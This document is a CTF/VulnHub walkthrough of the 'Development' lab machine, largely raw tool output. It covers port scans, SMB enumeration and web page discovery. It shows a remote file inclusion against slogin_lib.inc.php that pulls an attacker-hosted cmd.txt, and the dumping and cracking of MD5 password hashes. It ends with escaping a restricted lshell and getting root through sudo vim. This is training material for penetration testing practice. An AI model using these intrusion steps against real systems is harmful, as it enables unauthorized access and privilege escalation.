https://www.hackingarticles.in/development-vulnhub-walkthrough/


This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. 
This is designed for OSCP practice, and the original version of the machine was used for a CTF. 
It is now revived, and made slightly more nefarious than the original.

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): 
Development is 
(#1): different from production, 
(#2): a mess of code, 
(#3): under construction.

Note: Some users report the box may seem to be "unstable" with aggressive scanning. The homepage gives a clue why.

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.


Modification file /etc/netplan/50-cloud-init.yaml
    
    # login : patrick/P@ssw0rd25
    # /etc/netplan/50-cloud-init.yaml
    network:
        ethernets:
            enp0s17:
                addresses: []
                dhcp4: true
                optional: true
        version: 2


└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.19
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 07:47 CEST
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 07:48 (0:00:23 remaining)
Nmap scan report for 192.168.110.19
Host is up (0.00052s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Apr 2021 07:47:09 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Apr 2021 07:47:09 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 17 Apr 2021 07:47:09 GMT
|     Server: IIS 6.0
|     Content-Length: 293
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 192.168.110.19 Port 8080</address>
|_    </body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: IIS 6.0
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=4/17%Time=607A765E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20Apr\x202
SF:021\x2007:47:09\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\x20W
SF:ed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de32091
SF:ad69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary:\x2
SF:0Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/html\
SF:r\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR\x20
SF:OUTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welcome\
SF:x20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20are\x
SF:20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20thes
SF:e\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20We\x
SF:20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection\x20
SF:system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@goodte
SF:ch\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\x20b
SF:y\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20deve
SF:lopment\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20-->\
SF:r\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</html>\
SF:r\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x
SF:20Apr\x202021\x2007:47:09\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow:\x2
SF:0GET,POST,OPTIONS,HEAD\r\nContent-Length:\x200\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1CC,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nDate:\x20Sat,\x2017\x20Apr\x202021\x2007:47:0
SF:9\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20293\r\nConnect
SF:ion:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\r\n\
SF:r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN\">
SF:\n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>\n<h
SF:1>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x20th
SF:at\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>\n<h
SF:r>\n<address>IIS\x206\.0\x20Server\x20at\x20192\.168\.110\.19\x20Port\x
SF:208080</address>\n</body></html>\n");
MAC Address: 08:00:27:67:00:51 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m57s, deviation: 0s, median: 1h59m57s
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2021-04-17T07:48:40+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-17T07:48:40
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.110.19


└─$ curl http://192.168.110.19:8080/html_pages                                  
-rw-r--r-- 1 www-data www-data      285 Sep 26 17:46 about.html
-rw-r--r-- 1 www-data www-data     1049 Sep 26 17:51 config.html
-rw-r--r-- 1 www-data www-data      199 Jul 23 15:37 default.html
-rw-r--r-- 1 www-data www-data     1086 Sep 28 09:22 development.html
-rw-r--r-- 1 www-data www-data      446 Jun 14 01:37 downloads.html
-rw-r--r-- 1 www-data www-data      285 Sep 26 17:53 error.html
-rw-r--r-- 1 www-data www-data        0 Sep 28 09:23 html_pages
-rw-r--r-- 1 www-data www-data      751 Sep 28 09:22 index.html
-rw-r--r-- 1 www-data www-data      202 Sep 26 17:57 login.html
-rw-r--r-- 1 www-data www-data      682 Jul 23 15:36 register.html
-rw-r--r-- 1 www-data www-data       74 Jul 23 16:29 tryharder.html
-rw-r--r-- 1 www-data www-data      186 Sep 26 17:58 uploads.html



└─$ enum4linux -a 192.168.110.19
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 17 07:59:09 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.110.19
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.110.19    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.110.19    |
 ============================================== 
Looking up status of 192.168.110.19
        DEVELOPMENT     <00> -         B <ACTIVE>  Workstation Service
        DEVELOPMENT     <03> -         B <ACTIVE>  Messenger Service
        DEVELOPMENT     <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.110.19    |
 ======================================= 
[+] Server 192.168.110.19 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.110.19    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.110.19    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.110.19 from smbclient: 
[+] Got OS info for 192.168.110.19 from srvinfo:
        DEVELOPMENT    Wk Sv PrQ Unx NT SNT development server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================== 
|    Users on 192.168.110.19    |
 =============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: intern   Name:   Desc: 

user:[intern] rid:[0x3e8]

 =========================================== 
|    Share Enumeration on 192.168.110.19    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        access          Disk      
        IPC$            IPC       IPC Service (development server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.110.19
//192.168.110.19/print$ Mapping: DENIED, Listing: N/A
//192.168.110.19/access Mapping: DENIED, Listing: N/A
//192.168.110.19/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*


 ========================================================================= 
|    Users on 192.168.110.19 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-779411179-1483911247-3630892801
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\admin (Local User)
S-1-22-1-1001 Unix User\patrick (Local User)
S-1-22-1-1002 Unix User\intern (Local User)
S-1-22-1-1003 Unix User\ossec (Local User)
S-1-22-1-1004 Unix User\ossecm (Local User)
S-1-22-1-1005 Unix User\ossecr (Local User)
[+] Enumerating users using SID S-1-5-21-779411179-1483911247-3630892801 and logon username '', password ''
S-1-5-21-779411179-1483911247-3630892801-500 *unknown*\*unknown* (8)
S-1-5-21-779411179-1483911247-3630892801-501 DEVELOPMENT\nobody (Local User)

S-1-5-21-779411179-1483911247-3630892801-513 DEVELOPMENT\None (Domain Group)

S-1-5-21-779411179-1483911247-3630892801-1000 DEVELOPMENT\intern (Local User)




└─$ dirb http://192.168.110.19:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr 17 08:01:50 2021
URL_BASE: http://192.168.110.19:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.19:8080/ ----
+ http://192.168.110.19:8080/_vti_bin (CODE:200|SIZE:154)
+ http://192.168.110.19:8080/_vti_cnf (CODE:200|SIZE:154)
+ http://192.168.110.19:8080/_vti_pvt (CODE:200|SIZE:154)
+ http://192.168.110.19:8080/about (CODE:200|SIZE:936)
==> DIRECTORY: http://192.168.110.19:8080/aspnet_client/
+ http://192.168.110.19:8080/development (CODE:200|SIZE:576)
+ http://192.168.110.19:8080/error (CODE:200|SIZE:29)
+ http://192.168.110.19:8080/index.html (CODE:200|SIZE:560)
+ http://192.168.110.19:8080/root (CODE:200|SIZE:144)
+ http://192.168.110.19:8080/server-status (CODE:403|SIZE:289)
---- Entering directory: http://192.168.110.19:8080/aspnet_client/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
-----------------
END_TIME: Sat Apr 17 08:01:51 2021
DOWNLOADED: 4612 - FOUND: 9




└─$ curl http://192.168.110.19:8080/development
Under development we have a variety of projects.

/test.pcap: a simple bash script that allows Director, from the comfort of his desk, to be routinely fed network information. He can then employ a scraper to download the .pcap files to view at his own convenience.
/development.html: the landing page to our development secret page. Only insiders will know!
/registration: under construction.

We are also testing a very simple web-based log-in form, a HIDS called OSSEC (heard it is awesome) and some other developments.

The question is, do you know what to do? Try harder!



└─$ curl http://192.168.110.19:8080/development.html
<html>
<head><title>Security by Obscurity: The Path to DEVELOPMENTSECRETPAGE.</title>
</head>
<body>
<p>Security by obscurity is one of the worst ways one can defend from a cyberattack. 
This assumes that the adversary is not smart enough to be able to detect weak points in a corporate network.</p>
<p>An example of security by obscurity is in the local of webpages. 
For instance, IT administrators like to insert backdoors into applications for remote management, 
sometimes without the project teams knowing.</p>
<p>Once I worked on an implementation whereby the developer added a backdoor which was aptly named "hackersecretpage". 
It was hilarious because it contained a link to a file upload function, where the hacker installed a VNC viewer to perform remote desktop management!</p>
<p>A pity Patrick claims to be a security advocate, but isn't one. 
Hence, I shall secretly write in pages to guide hackers to make Patrick learn his lesson the hard way.</p>
</body>

<hr>
<i>Powered by IIS 6.0.</i>

</html>

<!-- You tried harder! Visit ./developmentsecretpage. -->


└─$ curl http://192.168.110.19:8080/developmentsecretpage/
<html>
<head>
<title>Welcome to Good Tech</title>
</head>
<body>

<p>
Welcome to the Development Secret Page. 
</p>

<p>
Please drop by <a href="./patrick.php">Patrick's</a> PHP page to get to know our Development Head better. But beware, this site is still under construction; please bear with us!
</p>


This is the property of Good Tech. All rights reserved.
</body>
</html>

└─$ curl http://192.168.110.19:8080/developmentsecretpage/patrick.php
<html>
<head>
<title>Page title</title>
</head>
<body>
<p> Welcome to my profile page! I am Patrick, the Head of Development in Good Tech. </p>

<p> I have previously worked in enterprise technologies. I joined Good Tech two years ago as the then-Manager of Development. 
I lead two teams: one that does enterprise architecture and an in-house development team.
</p>

<p> As long as you're willing to <b>try harder</b>, there will always be a future for the young aspiring developer or solution architect! 
Please visit our <a href="./sitemap.php">sitemap</a> to find out more about our department.</p>

<p> Regards <br/>
Patrick<br/>
Head, Development Network</p>

<p>
<a href="/developmentsecretpage/patrick.php?logout=1">Click here to log out.</a>
</p>

This is the property of Good Tech. All rights reserved.
</body>
</html>



└─$ curl http://192.168.110.19:8080/developmentsecretpage/sitemap.php
<html>
<head>
<title>A Map of the Development Network -- the Brains of Good Tech</title>
</head>
<body>
<!-- Intern, please perform the proper hyperlinking of the sitemap.-->
<!-- Patrick, Head Development-->

<p> Hi fellow colleague! Currently we only have links to the <a href="./securitynotice.php">security notice</a> 
and the <a href="./directortestpagev1.php">director test page</a>. 
<b>With effect from 11/2/2017, we have shifted the test page to the main webroot. You will know how to find it easily.</b> </p>

<p> For more enquiries, please feel free to speak to <a href="./patrick.php">Patrick</a>, our Head of Development.</p>

<p> If there are any bugs, please find the intern at <a href="intern@goodtech.org.sg">the intern's contact page.</a></p>

<p> Regards <br/>
Patrick<br/>
Head, Development Network</p>

<p>
<a href="/developmentsecretpage/sitemap.php?logout=1">Click here to log out.</a>
</p>

This is the property of Good Tech. All rights reserved.
</body>
</html>



└─$ curl http://192.168.110.19:8080/developmentsecretpage/securitynotice.php                                                                                                          130 ⨯
<html>
<head>
<title>Security Notice</title>
</head>
<body>
<p> Recently a security audit was conducted in the Development environment. </p>

<p> We found that our developers have been using passwords that resembled dictionary words, and are easily crackable. The most common offenders are:<br/>
1. password<br/>
2. Password<br/>
3. P@ssw0rd<br/>
</p>

<p>(Yes, we know that Number 3 is compliant with our strong password policy, but we found so many copies of this password that it might be as good as junk from a security angle. Please at least use something like P@ssw0rd1...)</p>

<p> Effective today, any <b>permanent</b> staff found with such passwords in the Development environment will be subject to a security remedial training. Also, we will extend the password expiry enforcement of thirty (30) days from heads and above to all permanent staff of the company. The password history will be set to 10, though if you would like, you can always "cycle" through more passwords.</p>

<p> Regards <br/>
Patrick<br/>
Head, Development Network</p>

<p>
<a href="/developmentsecretpage/securitynotice.php?logout=1">Click here to log out.</a>
</p>

This is the property of Good Tech. All rights reserved.
</body>
</html>

└─$ curl http://192.168.110.19:8080/developmentsecretpage/directortestpagev1.php
<html>
<head>
<title>Director's Update Panel Version 1.0</title>
</head>
<body>
<p> Hi Director! This is the test page to provide Director with eye-catching updates. </p>

<p> We know Director is busy and hence needs updates delivered in a timely manner.</p>

<p> Patrick and I will routinely update this page with a pop-up that details if there is anything important.</p>

<script>alert("Director, there is nothing for your immediate attention.");</script>

<!-- Director's comments: Does this not appear to be rather silly? I think we can make use of shoutbox. -->
<!-- Patrick's response: OK. When do you want it? -->
<!-- Director's comments: In three months' time. -->
<!-- Patrick's response: We have cleared test.html for testing purposes. We'll put up a warning for the rest to know it is not to be meddled. -->
<!-- Director's comments: Approved. -->

<p> Regards <br/>
Patrick<br/>
Head, Development Network</p>

<p>
<a href="/developmentsecretpage/directortestpagev1.php?logout=1">Click here to log out.</a>
</p>

This is the property of Good Tech. All rights reserved.
</body>
</html>



└─$ curl http://192.168.110.19:8080/developmentsecretpage/directortestpagev1.php?logout=1
<html>
<head>
<title>Director's Update Panel Version 1.0</title>
</head>
<body><!--  This is the login form  -->
<form method="post" action="/developmentsecretpage/directortestpagev1.php">
Username: <input type="text" name="slogin_POST_username" value=""><br>
Password: <input type="password" name="slogin_POST_password"><br>
<input type="submit" name="slogin_POST_send" value="Enter">
</form>
This is the property of Good Tech. All rights reserved.
</body>
</html> 



Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336


http://www.example.com/[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell] 


Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335

└─$ curl http://192.168.110.19:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.110.1:8888/cmd.txt
└─$ curl http://192.168.110.19:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=slog_users.txt 



└─$ curl http://192.168.110.19:8080/developmentsecretpage/slog_users.txt 
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98


https://md5decrypt.net/#answer
https://md5.gromweb.com/?md5=4a8a2b374f463b7aedbb44a066363b81
admin	:	3cb1d13bb83ffff2defe8d1443d3a0eb	[ Unfound ]
intern	:	4a8a2b374f463b7aedbb44a066363b81	12345678900987654321
patrick	:	87e6d56ce79af90dbe07d387d3d0579e	P@ssw0rd25
qiu	:	ee64497098d0926d198f54f6d5431f98	qiu 


S-1-22-1-1000 Unix User\admin (Local User)
S-1-22-1-1001 Unix User\patrick (Local User)
S-1-22-1-1002 Unix User\intern (Local User)
S-1-22-1-1003 Unix User\ossec (Local User)
S-1-22-1-1004 Unix User\ossecm (Local User)
S-1-22-1-1005 Unix User\ossecr (Local User)


intern:~$ echo $SHELL
/usr/local/bin/lshell
intern:~$ os.system('/bin/bash')
intern@development:~$ id
uid=1002(intern) gid=1006(intern) groups=1006(intern)
intern@development:~$ env
SSH_CONNECTION=192.168.110.20 46394 192.168.110.19 22
LANG=en_US.UTF-8
OLDPWD=/home/intern
XDG_SESSION_ID=7
USER=intern
PWD=/home/intern
LINES=57
HOME=/home/intern
SSH_CLIENT=192.168.110.20 46394 22
SSH_TTY=/dev/pts/0
COLUMNS=188
MAIL=/var/mail/intern
SHELL=/usr/local/bin/lshell
TERM=xterm-256color
LSHELL_ARGS=['--config', '/etc/lshell.conf']
SHLVL=1
LOGNAME=intern
XDG_RUNTIME_DIR=/run/user/1002
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
_=/usr/bin/env
cat /etc/passwd
...
intern:x:1002:1006::/home/intern:/usr/local/bin/lshell
...
intern@development:~$ su patrick
Password: P@ssw0rd25
patrick@development:/home/intern$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
patrick@development:/home/intern$ sudo /usr/bin/vim
[sudo] password for patrick: P@ssw0rd25 
:shell
root@development:~# id
uid=0(root) gid=0(root) groups=0(root)

root@development:/etc/ssh# cat sshd_config

AllowUsers admin intern
